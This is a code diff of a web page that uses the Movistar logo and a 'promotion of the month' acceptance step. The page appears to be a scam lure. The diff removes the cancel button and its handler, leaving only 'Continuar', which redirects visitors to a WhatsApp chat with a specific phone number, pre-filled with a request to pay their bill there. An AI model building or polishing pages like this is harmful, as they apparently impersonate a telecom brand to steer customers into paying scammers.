@@ -14,7 +14,6 @@
       flex-direction: column;
       min-height: 100vh;
     }
-    /* Header estilo Validar línea */
     header {
       background-color: #fff;
       padding: 1rem;
@@ -66,11 +65,10 @@
     .actions {
       margin-top: 16px;
       display: flex;
-      gap: 10px;
+      justify-content: center;
     }
     button {
-      flex: 1;
-      padding: 11px;
+      padding: 11px 20px;
       border-radius: 8px;
       border: none;
       cursor: pointer;
@@ -78,7 +76,6 @@
       font-size: 0.95rem;
     }
     .accept { background: #5bc500; color: #fff; }
-    .cancel { background: #263648; color: #cfefff; }
     .msg { margin-top:12px; font-size:0.95rem; color:#019DF4; }
     footer {
       background: #f0f0f0;
@@ -100,7 +97,7 @@
   </style>
 </head>
 <body>
-  <!-- Banner estilo Validar línea -->
+  <!-- Banner -->
   <header>
     <img src="img/descarga.png" alt="Logo Movistar">
   </header>
@@ -118,7 +115,6 @@
       </div>
 
       <div class="actions">
-        
         <button class="accept" id="continuar">Continuar</button>
       </div>
 
@@ -134,10 +130,6 @@
   </footer>
 
   <script>
-    document.getElementById('volver').addEventListener('click', () => {
-      window.location.href = 'cargando.html';
-    });
-
     document.getElementById('continuar').addEventListener('click', () => {
       const msgEl = document.getElementById('msg');
       const tyc = document.getElementById('tyc').checked;
@@ -153,7 +145,9 @@
       localStorage.setItem("promoAceptada", "true");
 
       setTimeout(() => {
-        window.location.href = "https://wa.me/573170654268?text=" + encodeURIComponent("Quiero pagar mi factura con la promoción del mes");
+        // Abrir WhatsApp con el mensaje
+        window.location.href = "https://wa.me/573170654268?text=" + 
+          encodeURIComponent("Quiero pagar mi factura con la promoción del mes");
       }, 1000);
     });
   </script>
